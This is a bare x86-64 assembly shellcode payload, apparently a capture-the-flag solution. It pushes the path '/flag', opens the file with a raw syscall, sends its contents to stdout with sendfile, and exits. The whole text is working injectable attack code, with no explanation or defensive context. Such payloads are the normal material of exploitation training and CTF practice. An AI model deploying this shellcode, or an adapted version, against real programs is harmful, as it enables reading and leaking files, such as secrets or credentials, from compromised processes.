.global _start
_start:
.intel_syntax noprefix

mov rbx, 0x00000067616c662f
push rbx
mov rax, 2
mov rdi, rsp
mov rsi, 0
syscall

mov rdi, 1
mov rsi, rax 
mov rdx, 0 
mov r10, 1000
mov rax, 40 
syscall

xor rax, rax
mov rax, 60
syscall
